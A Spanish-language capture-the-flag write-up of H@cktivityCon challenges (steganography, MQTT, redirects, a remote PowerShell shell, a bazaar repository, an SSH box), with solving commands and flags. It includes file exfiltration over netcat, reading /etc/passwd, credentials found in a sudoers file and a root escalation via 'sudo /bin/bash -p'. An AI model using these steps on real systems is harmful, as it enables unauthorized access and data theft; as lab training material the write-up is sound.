# H@cktivityCon

Pequeño writeup de las task que resolvi con el equipo Team Cybex durante el transcurso de este CTF donde quedamos en el top 91
## Stego

### Spy vs. Spy
```Chall
Antonio Prohías was a cartoonist known primarily as the creator of the satirical comic strip Spy vs. Spy for Mad magazine. It wasn't until after 1997 when the comics changed from black and white to full color.
```
Lo primero en lo que me fije al ver la imagen era el morse que habia en el fondo de la imagen, pero resulta que es una firma del autor, una vez averigue eso decidí probar las herramientas típicas, strings, steghide...

Finalmente stegoveritas saco la flag escondida en una de las imagenes
```flag
flag{two_MAD_spies}
```

### Cold War
```Chall
A geopolitical activity that is pursued through economic and political actions, propaganda, acts of espionage or proxy wars and without direct military action is known as a Cold War. This type of war does not refer to conflict of seasons, but this challenge might.
```
Mirando el texto vemos lineas con  muchos espacios en blanco, suele ser un indicador de Snow, descargamos el archivo y

```bash 
stegsnow -C cold_war.txt
```
Y nos da la flag
```flag
flag{do_not_use_merriam_webster}
```

## Internet of Things

### IoT Itch
```Chall
See if you have the patience to scratch the itch; patience is key. Mosquitto bites are so annoying!

Connect with:
nc 209.97.159.20 1883
```
Netcat no trabaja con mqtt, asi que usamos mqtt_sub para obtener la flag, como no nos dan un brocker usaremos un wildcard '#'
```bash
mosquitto_sub -v -h 209.97.159.20 -p 1883 -t '#' | grep flag
```
Y tras obtener varios falsos positivos finalmente obtuvimos la flag

```flag
flag{m05qu1770_b17e5_4R3n7_50_B4D}
```
## Scripting

### Misdirection
```Chall
Check out the new Flag Finder service! We will find the flag for you!

Connect here:
http://jh2i.com:50011/
```
Bien cuando accedemos al enlace y usamos el servicio de obtención de flags entramos en una cadena de redirecciones, en cada respuesta antes de redireccionarnos nos dan un caracter de la flag

Si las interceptamos todas con burpsuite podemos constriuir la flag
```flag
flag{http_302_point_you_in_the_right_redirection}
```

### Prophecy
```
C A N Y O U S E E T H E F U T U R E ?

Connect with:
nc jh2i.com 50012
```
Cada vez que nos conectamos tenemos que averiguar un número, van cambiando de manera pseudo aleatoria pero hay una secuencia que funciona mas veces, vamos averiguandola número a número y listo
```python
from pwn import *

profecy = [ 99126 , 76106 ,32378 , 49560, 87935     , 17366 , 36639 , 33561 , 51241 ,24009 ,82718 ,65774 ,87030 ,53097 , 53885 , 29931 ,10890 ,20583 ,46190,83643,0,0] 

for i in range (0,20):
    conex = remote( "jh2i.com" , 50012 )#Conecto
    j = 0
    try:
        for k in profecy:
            uwu = conex.recvuntil('>')#Recibo hasta el prompt
            print uwu 
            conex.sendline( str(k) + '\n')
            uwu = conex.recvline()
            if (k == 83643): 
                uwu = conex.recvall()
                print("FLAG: " + str(uwu).replace("\n"," "))
            try:
                uwu = conex.recvline()
                print(uwu + " " + str( k ))
                if (k == 0) :
                    print ("LOOOOOOOOOOOOOOOOOOOOK   " + uwu) # Para poder grepear el output cuando falla
            except:
                print("[*] Explotit completed but no session was created")#Pentester joke
                pass
    except:
        pass
```
Y tras 4 o 5 interacciones obtenemos la flag
```flag
flag{does_this_count_as_artificial_intelligence}
```

### Rescue Mission
```
Oh no! The flag has been lost in the most disconcerting places! Can you save the flag??

Connect here:
nc jh2i.com 50013
```
Al conectarnos obtenemos sesion en una máquina remota
 
```
PS /c_drive> dir
dir


    Directory: /c_drive

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----          07/29/2020    01:52                stuck_in

PS /c_drive> cd stuck_in
cd stuck_in
PS /c_drive/stuck_in> dir
dir


    Directory: /c_drive/stuck_in

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d----          07/29/2020    01:52                a_cave
d----          07/29/2020    01:52                a_coffin_underground
d----          07/29/2020    01:52                a_haunted_hotel
d----          07/29/2020    01:52                a_nightmare
d----          07/29/2020    01:52                a_roller_coaster
d----          07/29/2020    01:52                a_ski_lift
d----          07/29/2020    01:52                a_stalled_elevator
d----          07/29/2020    01:52                quarantine
d----          07/29/2020    01:52                space
d----          07/29/2020    01:52                the_ocean
d----          07/29/2020    01:52                the_subway

PS /c_drive/stuck_in> dir */*
dir */*


    Directory: /c_drive/stuck_in/the_ocean

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-----          07/25/2020    01:57           2197 flag.png
```
Ahora exfiltramos la flag para ello hacemos un volcado hexadecimal de la misma
```
PS /c_drive/stuck_in/the_ocean> format-hex flag.png
```
Y la reconstruimos desde el volcado
```
La flag al final la saco W1C3
```

### Flushed
```
It is like Rescue Mission all over again! Except this time... the flag was flushed down the toilet!

Connect here:
nc jh2i.com 50015
```
El formato es parecido al anterior solo que en vez de un hexdump lo hicimos con base64, aunque con la complicación de que el output esta en ascii art
```bash
echo 'base64 -w 1 flag.png;exit' | nc jh2i.com 50015
```
Luego solo nos toca ir sustituyendo las letras ascii art  y revertir el base64 a una imagen
```flag
flag{flushed_down_the_toilet_but_rescued_again}
```

## OSINT

### World Hotspots 
```
What can you tell me about 9C:EF:D5:FB:9F:F0?
```
Podria ser una MAC o un BSSID busquemos en wiggle a ver que nos dicen al respecto
```flag
flag{network_osint}
```

## WarmUp

### Read The Rules
```
Please follow the rules for this CTF!

Connect here:
https://ctf.hacktivitycon.com/rules
```
Nos conectamos a /rules y miramos en el código fuente
```flag
flag{its_time_to_hack}
```

###  Common Place 
```


asd7138: can you find the flag here?
tcm3137: no, i dont see it
jwh8163: i cant find it either
rfc5785: i found it
asd7138: what!? where?!
jwh8163: tell us!



Connect here:
http://jh2i.com:50007 
```
Nos conectamos y nos dicen que la flag esta un lugar bien conocido, si revisamos la conversacion anterior hay un nombre que es rfc5785, podria ser casualidad o ser un una referencia a un RFC
```URL
https://tools.ietf.org/html/rfc5785
```
Le hechamos un vistazo y vemos referencias a este directorio '/.well-known/' , si accedemos a el veremos la flag
```flag
flag{rfc5785_defines_yet_another_common_place}
```

###  Private Investigator 
```
We have hired you to help investigate this private key. Please use it to connect to the server like so:

ssh -i id_rsa user@jh2i.com -p 50004
```
Intentamos logearnos con el comando y la clave pero el formato es incorrecto, si miramos la clave falta un salto de línea, lo añadimos y nos conectamos
```flag
flag{dont_ever_forget_that_newline}
```

## Forensics

### Bizarro
```
This thing looks... bizarre? Can you find any secrets it may have?

Download the file below.
```
Descargamos el archivo y vemos que es un repositorio de bazaar
Creamos un repo propio
```
mkdir ctf-bzr
cd ctf-bzr/
bzr init
echo 'foo' > foo.txt
bzr add
bzr commit -m "foo"
rm foo.txt
```
Sustituimos los archivos del repo recien creado por los de un repo nuevo de bazaar
```
.bzr/branch/last-revision
.bzr/checkout/dirstate
.bzr/repository/pack*
```
Hacemos un chech
```
bzr check
```
Y todo debería ir bien, si no solucionar las dependecias, tras esto buscar la flag en los commits

```
R=1
while true; do
   RNEXT=$((R+1))
   
   # Analyzing diff.
   REVISION=$(bzr diff -r$R..$RNEXT)
   if [[ $REVISION == "" ]]; then
      break
   elif [[ $REVISION == *"flag"* ]]; then
      echo "[*] ... $R -> $RNEXT"
      echo $REVISION
   fi

   R=$RNEXT
done
```

```flag
flag{is_bazaar_bizarre_or_is_it_just_me}
```
## Miscellaneous

### Pseudo
```
Someone here has special powers... but who? And how!?

Connect here:
ssh -p 50014 user@jh2i.com # password is 'userpass'
```
Nos conectamos por ssh y:
```bash
user@485e7954dcb8:~$ id
uid=1000(user) gid=1000(user) groups=1000(user)
```
Vamos a buscar otros usuarios con aceso via terminal
```
user@485e7954dcb8:~$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
user:x:1000:1000:,,,:/home/user:/bin/bash
james:x:1001:1001:,,,:/home/james:/bin/bash
mary:x:1002:1002:,,,:/home/mary:/bin/bash
robert:x:1003:1003:,,,:/home/robert:/bin/bash
linda:x:1004:1004:,,,:/home/linda:/bin/bash
todd:x:1005:1005:,,,:/home/todd:/bin/bash
david:x:1006:1006:,,,:/home/david:/bin/bash
susan:x:1007:1007:,,,:/home/susan:/bin/bash
doug:x:1008:1008:,,,:/home/doug:/bin/bash
brian:x:1009:1009:,,,:/home/brian:/bin/bash
lisa:x:1010:1010:,,,:/home/lisa:/bin/bash
jessica:x:1011:1011:,,,:/home/jessica:/bin/bash
alicia:x:1012:1012:,,,:/home/alicia:/bin/bash
michael:x:1013:1013:,,,:/home/michael:/bin/bash
chris:x:1014:1014:,,,:/home/chris:/bin/bash
karen:x:1015:1015:,,,:/home/karen:/bin/bash
nancy:x:1016:1016:,,,:/home/nancy:/bin/bash
mark:x:1017:1017:,,,:/home/mark:/bin/bash
paul:x:1018:1018:,,,:/home/paul:/bin/bash
lauren:x:1019:1019:,,,:/home/lauren:/bin/bash
jason:x:1020:1020:,,,:/home/jason:/bin/bash
ryan:x:1021:1021:,,,:/home/ryan:/bin/bash
sharon:x:1022:1022:,,,:/home/sharon:/bin/bash
edward:x:1023:1023:,,,:/home/edward:/bin/bash
timothy:x:1024:1024:,,,:/home/timothy:/bin/bash
helen:x:1025:1025:,,,:/home/helen:/bin/bash
gary:x:1026:1026:,,,:/home/gary:/bin/bash
anna:x:1027:1027:,,,:/home/anna:/bin/bash
brenda:x:1028:1028:,,,:/home/brenda:/bin/bash
rachel:x:1029:1029:,,,:/home/rachel:/bin/bash
sam:x:1030:1030:,,,:/home/sam:/bin/bash
dennis:x:1031:1031:,,,:/home/dennis:/bin/bash
diane:x:1032:1032:,,,:/home/diane:/bin/bash
adam:x:1033:1033:,,,:/home/adam:/bin/bash
peter:x:1034:1034:,,,:/home/peter:/bin/bash
kelly:x:1035:1035:,,,:/home/kelly:/bin/bash
```
Vemos que hay muchos, busquemos a ver si hay mas pistas

```bash
user@485e7954dcb8:~$ cat /etc/sudoers.d/README  
#
# As of Debian version 1.7.2p1-1, the default /etc/sudoers file created on
# installation of the package now includes the directive:
#
#       #includedir /etc/sudoers.d
#
# This will cause sudo to read and parse any files in the /etc/sudoers.d
# directory that do not end in '~' or contain a '.' character.
#
# Note that there must be at least one file in the sudoers.d directory (this
# one will do), and all files in this directory should be mode 0440.
#
# Note also, that because sudoers contents can vary widely, no attempt is
# made to add this directive to existing sudoers files on upgrade.  Feel free
# to add the above directive to the end of your /etc/sudoers file to enable
# this functionality for existing installations if you wish!
#
# Finally, please note that using the visudo command is the recommended way
# to update sudoers content, since it protects against many failure modes.
# See the man page for visudo for more information.
#
#
# The credentials for the 'todd' account is 'needle_in_a_haystack'
todd ALL = NOPASSWD: ALL
```
Vemos que el usuario todd tiene acceso a cualquier comando via sudo, vamos a logearnos como el 

```bash
user@485e7954dcb8:~$ su todd 
Password: 
todd@485e7954dcb8:/home/user$ id
uid=1005(todd) gid=1005(todd) groups=1005(todd)
```
Ya estamos como todd, checkeemos si realmente tenemos esos permisos
```bash
todd@485e7954dcb8:/home/user$ sudo -l
Matching Defaults entries for todd on 485e7954dcb8:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User todd may run the following commands on 485e7954dcb8:
    (root) NOPASSWD: ALL
todd@485e7954dcb8:/home/user$ 
```

Con esto podemos conseguir sesion como root facilmente y recuperar la flag 
```
todd@b2e38fe3090f:~$ sudo /bin/bash -p
root@b2e38fe3090f:~# id
uid=0(root) gid=0(root) groups=0(root)
root@b2e38fe3090f:~# ls /root
flag.txt
root@b2e38fe3090f:~# cat /root/flag.txt 
flag{hmmm_that_could_be_a_sneaky_backdoor}
```


